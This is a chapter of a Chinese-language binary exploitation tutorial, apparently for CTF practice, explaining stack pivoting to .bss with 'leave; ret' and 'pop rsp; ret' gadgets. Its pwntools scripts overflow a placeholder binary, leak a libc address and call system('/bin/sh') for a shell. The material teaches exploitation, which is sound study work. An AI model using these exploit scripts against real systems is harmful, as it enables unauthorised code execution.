# 第 13 章 栈迁移：当栈不够用时

> 有时候你能溢出的空间只有几十字节，放不下完整的 ROP 链。别急——既然栈上空间不够，那就把栈「搬」到一个更大的地方去。

---

## 13.1 为什么需要栈迁移

想象这样的场景：

```c
void vulnerable() {
    char buf[40];
    read(0, buf, 60);    // 只能溢出 20 字节
}
```

你只能覆盖 20 字节（保存的 rbp 8 字节 + 返回地址 8 字节 + 一点点）。这 20 字节根本放不下一条 ret2libc 的 ROP 链（需要 40+ 字节）。

但如果程序有另一个输入点，能把数据写到一个已知地址（比如 `.bss`），并且 `.bss` 足够大，那我们可以：

1. 把完整的 ROP 链写到 `.bss`
2. 用栈溢出把 rsp「迁移」到 `.bss`
3. 让程序从 `.bss` 上执行 ROP 链

这就是**栈迁移（Stack Pivot）**。

---

## 13.2 leave; ret 的妙用

栈迁移的核心 gadget 是函数尾声的 `leave; ret`。回顾第 6 章：

```asm
leave    ; mov rsp, rbp; pop rbp
ret      ; pop rip
```

展开成四步：

```text
1. rsp = rbp          ; 栈顶移到栈帧底部
2. rbp = [rsp]        ; 弹出调用者的 rbp（rsp += 8）
3. rip = [rsp]        ; 弹出返回地址（rsp += 8）
4. 跳转到 rip
```

关键的洞察在第一步：**rsp 被设置成了 rbp 的值**。而 rbp 是我们可以控制的（通过溢出覆盖保存的 rbp）！

所以，如果我们：

- 把 rbp 覆盖成目标地址（`target_addr`）
- 把返回地址覆盖成 `leave; ret` 的地址

当函数执行 `leave; ret` 时：

```text
rsp = rbp = target_addr     ← 栈被"搬"到了 target_addr
rbp = [target_addr]         ← 从新栈上弹出 rbp
rip = [target_addr + 8]     ← 从新栈上弹出返回地址（ROP 链的第一项）
```

从这一刻起，程序从 `target_addr` 开始「消费」我们的 ROP 链。

### 13.2.1 图示

```text
原来的栈：                       .bss（新栈）：
[ 填充 40 字节 ]                [ 伪造的 rbp ]
[ fake_rbp = bss_addr ] ──────→ [ ROP gadget 1 ]
[ leave; ret ]                  [ ROP gadget 2 ]
                                [ ... ]

执行流程：
1. 函数返回 → ret → 跳到 leave; ret
2. leave: rsp = rbp = bss_addr; pop rbp
3. ret: rip = [bss_addr+8] = ROP gadget 1
4. 继续执行 .bss 上的 ROP 链
```

## 13.3 栈迁移到 .bss

### 13.3.1 条件

要实现栈迁移，需要满足：

1. 能控制 rbp（通过溢出覆盖保存的 rbp）
2. 能控制返回地址为 `leave; ret` gadget
3. 有一块已知地址、足够大的可写内存（`.bss` 最常见，要求无 PIE）
4. 能把 ROP 链写到那块内存（通过程序的其他输入函数）

### 13.3.2 确定 leave; ret 的地址

```bash
ROPgadget --binary ./vuln | grep 'leave'
# 输出：0x0000000000001234 : leave ; ret
```

或者直接用函数尾声的地址：任何函数的 `leave; ret` 结尾都可以用。

### 13.3.3 payload 构造

假设：

- 到 rbp 的偏移是 40
- `.bss` 地址是 `0x404000`
- `leave_ret` 地址是 `0x401234`
- ROP 链已经通过另一个输入函数写到了 `0x404000`
- `.bss` 的开头要放一个「假的 rbp」（随便什么值，比如 0）

```python
from pwn import *

elf = ELF('./vuln')
bss_addr = elf.bss() + 0x100    # 选 bss 中一段空闲区域
leave_ret = 0x401234

# 第一步：把 ROP 链写入 bss（利用程序的另一个输入函数）
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')

p.sendlineafter(b'Where to write? ', p64(bss_addr))
p.sendlineafter(b'Data: ', p64(0) + rop.chain())   # bss 开头放 fake rbp

# 第二步：栈溢出，迁移到 bss
payload = flat({
    0: b'A' * 40,             # 填充到 rbp
    40: p64(bss_addr),        # 覆盖 rbp 为 bss 地址
    48: p64(leave_ret)        # 返回地址 = leave; ret
})

p.sendlineafter(b'Input: ', payload)
p.interactive()
```

### 13.3.4 细节：为什么 bss 开头要放 8 字节的 fake rbp

`leave` 指令执行时会做 `pop rbp`，也就是从新的栈顶（`bss_addr`）弹出 8 字节到 rbp。这 8 字节可以是任意值（只要你后面不依赖 rbp），但必须存在。所以 ROP 链前面要留 8 字节的占位。

紧接着 `ret` 弹出的是 `[bss_addr+8]`，这才是 ROP 链的第一个 gadget。

## 13.4 栈迁移 + ret2libc

栈迁移最常见的用途是配合 ret2libc：在 `.bss` 上构造泄露 + getshell 的完整 ROP 链。

```python
# 在 bss 上布置两阶段 ROP
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])     # 泄露 libc
rop.call('main')                       # 返回 main（但注意此时栈已经迁移到 bss）

# 写入 bss
p.sendlineafter(b'Where? ', p64(bss_addr))
p.sendlineafter(b'Data: ', p64(0) + rop.chain())

# 栈迁移
payload = flat({40: [p64(bss_addr), p64(leave_ret)]})
p.sendlineafter(b'Input: ', payload)

# 接收泄露
leak = p.recvline()
puts_addr = u64(leak[:6].ljust(8, b'\x00'))
libc_base = puts_addr - libc.sym['puts']

# 第二阶段：在 bss 上写 getshell 的 ROP
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

rop2 = ROP(elf)
rop2.call('system', [binsh_addr])

p.sendlineafter(b'Where? ', p64(bss_addr))
p.sendlineafter(b'Data: ', p64(0) + rop2.chain())

payload2 = flat({40: [p64(bss_addr), p64(leave_ret)]})
p.sendlineafter(b'Input: ', payload2)
p.interactive()
```

> ⚠️ **注意**：栈迁移后，`main` 的返回地址也在 bss 上（因为 rsp 指向 bss）。所以当 ROP 链调用 `main` 时，main 的栈帧会建立在 bss 上，而不是原来的栈上。这可能影响后续的溢出——需要重新计算偏移（相对于新的栈位置）。这是栈迁移题目最让人头疼的地方。

## 13.5 另一种栈迁移：pop rsp; ret

除了 `leave; ret`，还有一个更直接的 gadget：`pop rsp; ret`。

```asm
pop rsp    ; rsp = [栈上弹出的值]
ret        ; 从新的 rsp 处弹出返回地址
```

用这个 gadget，可以直接把 rsp 设成目标地址：

```python
payload = flat({
    offset: [
        pop_rsp_ret,    # 弹出下一个值到 rsp
        bss_addr,       # 新的 rsp
        # 接下来从 bss_addr 开始就是 ROP 链
    ]
})
```

`pop rsp; ret` 比 `leave; ret` 更直接（不需要控制 rbp），但程序中不一定找得到这个 gadget：

```bash
ROPgadget --binary ./vuln | grep 'pop rsp'
```

如果找不到，还是老老实实用 `leave; ret`。

---

## 13.6 实战提示

1. **目标地址的选择**：`.bss` 需要足够大且可写。用 `readelf -S` 看 `.bss` 的大小，或者直接用 `elf.bss()` + 一个偏移。
2. **PIE 开启时**：`.bss` 地址随机，需要先泄露 PIE 基址。
3. **栈迁移后的偏移**：程序的栈帧会建立在新的栈上（`.bss`），之前算的偏移不再适用。需要重新调试。
4. **多个输入点**：栈迁移通常需要至少两个输入点——一个写 ROP 到 bss，一个触发溢出。如果程序只有一个输入点，可能需要用其他技巧（比如一次性写入所有数据，然后利用栈上的内容）。

---

## 13.7 小结

这一章我们学了栈迁移：

- **适用场景**：溢出空间不足以放下完整 ROP 链
- **核心 gadget**：`leave; ret` 会把 rsp 设置为 rbp 的值，从而「搬栈」
- **目标地址**：通常是 `.bss`（无 PIE 时地址固定、可写、够大）
- **注意细节**：新栈开头要留 8 字节 fake rbp；栈迁移后偏移会变化

栈迁移是栈利用的「高阶技巧」，理解它需要你对 `leave; ret` 的每一步都清清楚楚。如果觉得绕，打开 gdb 单步执行一遍，看着 rsp 和 rbp 的变化，一切都会豁然开朗。
